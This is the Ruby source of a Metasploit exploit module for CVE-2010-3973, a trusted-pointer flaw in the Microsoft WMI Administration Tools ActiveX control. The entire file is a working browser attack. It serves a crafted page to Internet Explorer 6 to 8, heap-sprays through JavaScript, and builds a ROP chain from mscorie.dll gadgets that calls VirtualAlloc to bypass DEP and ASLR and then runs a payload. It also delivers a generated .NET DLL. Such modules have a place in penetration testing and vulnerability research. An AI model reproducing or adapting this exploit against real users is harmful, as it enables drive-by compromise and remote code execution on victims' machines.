##
# $Id: wmi_admintools.rb 11579 2011-01-14 16:25:37Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Remote::BrowserAutopwn

	autopwn_info({
		:os_name    => OperatingSystems::WINDOWS,
		:rank       => NormalRanking,
		:vuln_test  => nil,
	})

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft WMI Administration Tools ActiveX Buffer Overflow',
			'Description'    => %q{
					This module exploits a memory trust issue in the Microsoft WMI
				Administration tools ActiveX control. When processing a specially crafted
				HTML page, the WEBSingleView.ocx ActiveX Control (1.50.1131.0) will treat
				the 'lCtxHandle' parameter to the 'AddContextRef' and 'ReleaseContext' methods
				as a trusted pointer. It makes an indirect call via this pointer which leads
				to arbitrary code execution.

				This exploit utilizes a combination of heap spraying and the
				.NET 2.0 'mscorie.dll' module to bypass DEP and ASLR. This module does not
				opt-in to ASLR. As such, this module should be reliable on all Windows
				versions.

				The WMI Adminsitrative Tools are a standalone download & install (linked in the
				references).

			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'WooYun', 'MC', 'jduck' ],
			'Version'        => '$Revision: 11579 $',
			'References'     =>
				[
					[ 'OSVDB', '69942'],
					[ 'CVE', '2010-3973' ],
					[ 'BID', '45546' ],
					[ 'URL', 'http://wooyun.org/bug.php?action=view&id=1006' ],
					[ 'URL', 'http://xcon.xfocus.net/XCon2010_ChenXie_EN.pdf' ],  # .NET 2.0 ROP (slide 25)
					[ 'URL', 'http://secunia.com/advisories/42693' ],
					[ 'URL', 'http://www.microsoft.com/downloads/en/details.aspx?FamilyID=6430f853-1120-48db-8cc5-f2abdc3ed314' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'Space'         => 512,
					'BadChars'      => "\x00",
					'DisableNops'   => true
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { } ],
					[ 'Windows Universal',  { 'SprayTarget' => 0x105ae020 } ],
					[ 'Debug Target (Crash)', { 'SprayTarget' => 0x70707070 } ] # must be < 0x80000000
				],
			'DisclosureDate' => 'Dec 21 2010',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def auto_target(cli, request)
		mytarget = nil

		agent = request.headers['User-Agent']
		#print_status("Checking user agent: #{agent}")
		if agent =~ /MSIE 6\.0/ or agent =~ /MSIE 7\.0/ or agent =~ /MSIE 8\.0/
			mytarget = targets[1]
		else
			print_error("Unknown User-Agent #{agent} from #{cli.peerhost}:#{cli.peerport}")
		end
		mytarget
	end

	def on_request_uri(cli, request)

		mytarget = target
		if target.name == 'Automatic'
			mytarget = auto_target(cli, request)
			if (not mytarget)
				send_not_found(cli)
				return
			end
		end

		if request.uri == get_resource() or request.uri =~ /\/$/
			print_status("Sending #{self.refname} redirect to #{cli.peerhost}:#{cli.peerport} (target: #{mytarget.name})...")

			redir = get_resource()
			redir << '/' if redir[-1,1] != '/'
			redir << rand_text_alphanumeric(4+rand(4))
			redir << '.html'
			send_redirect(cli, redir)

		elsif request.uri =~ /\.html?$/
			# Re-generate the payload
			return if ((p = regenerate_payload(cli)) == nil)

			print_status("Sending #{self.refname} HTML to #{cli.peerhost}:#{cli.peerport} (target: #{mytarget.name})...")

			# Generate the ROP payload
			buf_addr = mytarget['SprayTarget']
			rvas = rvas_mscorie_v2()
			rop_stack = generate_rop(buf_addr, rvas)

			fix_esp = rva2addr(rvas, 'pop ebp / ret')
			pivot1  = rva2addr(rvas, 'call [ecx+4] / xor eax, eax / pop ebp / ret 8')
			pivot2  = rva2addr(rvas, 'xchg eax, esp / mov eax, [eax] / mov [esp], eax / ret')

			pivot_str = Rex::Text.to_unescape([pivot1].pack('V'))

			special_sauce = [
				buf_addr + 0x10,
				pivot2, # becomes eip via trusted ptr
				fix_esp,
				0xdeadbeef,
				pivot1, # used by AddContextRef
				pivot1  # used by ReleaseContext
			].pack('V*')

			# Append the payload to the rop_stack
			rop_stack << p.encoded

			# Add in the rest of the ROP stack
			special_sauce << rop_stack

			special_sauce = Rex::Text.to_unescape(special_sauce)
			shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
			nops      = Rex::Text.to_unescape(make_nops(4))
			js_function  = rand_text_alpha(rand(32)+1)
			vname  = rand_text_alpha(rand(32) + 1)

			clsid = "2745E5F5-D234-11D0-847A-00C04FD7BB08"
			progid = "WBEM.SingleViewCtrl.1"

			method_names = [
				"AddContextRef",
				"ReleaseContext"
			]

			method_name = method_names[rand(method_names.length)]

			# Construct the heap spray javascript
			custom_js = <<-EOS
function #{js_function}() {
heap = new heapLib.ie(0x20000);
var heapspray = unescape("#{special_sauce}");
while(heapspray.length < 0x1000) heapspray += unescape("%u4444");
var heapblock = heapspray;
while(heapblock.length < 0x40000) heapblock += heapblock;
finalspray = heapblock.substring(2, 0x40000 - 0x21);
for(var counter = 0; counter < 500; counter++) { heap.alloc(finalspray); }
#{vname}.#{method_name}(#{"0x%x" % buf_addr});
}
EOS
			js = heaplib(custom_js)

			dll_uri = get_resource()
			dll_uri << '/' if dll_uri[-1,1] != '/'
			dll_uri << "generic-" + Time.now.to_i.to_s + ".dll"

			# Construct the final page
			content = <<-EOS
<html>
<head>
<script language='javascript'>
#{js}
</script>
</head>
<body onload='#{js_function}()'>
<object classid="#{dll_uri}#GenericControl" />
<object classid="clsid:#{clsid}" id="#{vname}"></object>
</body>
</html>
EOS

			# Transmit the response to the client
			send_response_html(cli, content)

		elsif request.uri =~ /\.dll$/
			print_status("Sending #{self.refname} DLL to #{cli.peerhost}:#{cli.peerport} (target: #{mytarget.name})...")

			# Generate a .NET v2.0 DLL, note that it doesn't really matter what this contains since we don't actually
			# use it's contents ...
			ibase = (0x2000 | rand(0x8000)) << 16
			dll = Msf::Util::EXE.to_dotnetmem(ibase, rand_text(16))

			# Send a .NET v2.0 DLL down
			send_response(cli, dll,
				{
					'Content-Type' => 'application/x-msdownload',
					'Connection'   => 'close',
					'Pragma'       => 'no-cache'
				})
		end

		# Handle the payload
		handler(cli)
	end

	def rvas_mscorie_v2()
		# mscorie.dll version v2.0.50727.3053
		# Just return this hash
		{
			'call [ecx+4] / xor eax, eax / pop ebp / ret 8' => 0x237e,
			'xchg eax, esp / mov eax, [eax] / mov [esp], eax / ret' => 0x575b,
			'pop ebp / ret'          => 0x5557,
			'call [ecx] / pop ebp / ret 0xc' => 0x1ec4,
			'pop eax / ret'          => 0x5ba1,
			'pop ebx / ret'          => 0x54c0,
			'pop ecx / ret'          => 0x1e13,
			'pop esi / ret'          => 0x1d9a,
			'pop edi / ret'          => 0x2212,
			'mov [ecx], eax / mov al, 1 / pop ebp / ret 0xc' => 0x61f6,
			'movsd / mov ebp, 0x458bffff / sbb al, 0x3b / ret' => 0x6154,
		}
	end

	def generate_rop(buf_addr, rvas)
		# ROP fun! (XP SP3 English, Dec 15 2010)
		rvas.merge!({
			# Instructions / Name    => RVA
			'BaseAddress'            => 0x63f00000,
			'imp_VirtualAlloc'       => 0x10f4
		})

		rop_stack = [
			# Allocate an RWX memory segment
			'pop ecx / ret',
			'imp_VirtualAlloc',

			'call [ecx] / pop ebp / ret 0xc',
			0,         # lpAddress
			0x1000,    # dwSize
			0x3000,    # flAllocationType
			0x40,      # flProt
			:unused,

			# Copy the original payload
			'pop ecx / ret',
			:unused,
			:unused,
			:unused,
			:memcpy_dst,

			'mov [ecx], eax / mov al, 1 / pop ebp / ret 0xc',
			:unused,

			'pop esi / ret',
			:unused,
			:unused,
			:unused,
			:memcpy_src,

			'pop edi / ret',
			0xdeadf00d # to be filled in above
		]
		(0x200 / 4).times {
			rop_stack << 'movsd / mov ebp, 0x458bffff / sbb al, 0x3b / ret'
		}
		# Execute the payload ;)
		rop_stack << 'call [ecx] / pop ebp / ret 0xc'

		rop_stack.map! { |e|
			if e.kind_of? String
				# Meta-replace (RVA)
				raise RuntimeError, "Unable to locate key: \"#{e}\"" if not rvas[e]
				rvas['BaseAddress'] + rvas[e]

			elsif e == :unused
				# Randomize
				rand_text(4).unpack('V').first

			elsif e == :memcpy_src
				# Based on stack length..
				buf_addr + 0x18 + (rop_stack.length * 4)

			elsif e == :memcpy_dst
				# Store our new memory ptr into our buffer for later popping :)
				buf_addr + 0x18 + (21 * 4)

			else
				# Literal
				e
			end
		}

		rop_stack.pack('V*')
	end

	def rva2addr(rvas, key)
		raise RuntimeError, "Unable to locate key: \"#{key}\"" if not rvas[key]
		rvas['BaseAddress'] + rvas[key]
	end

end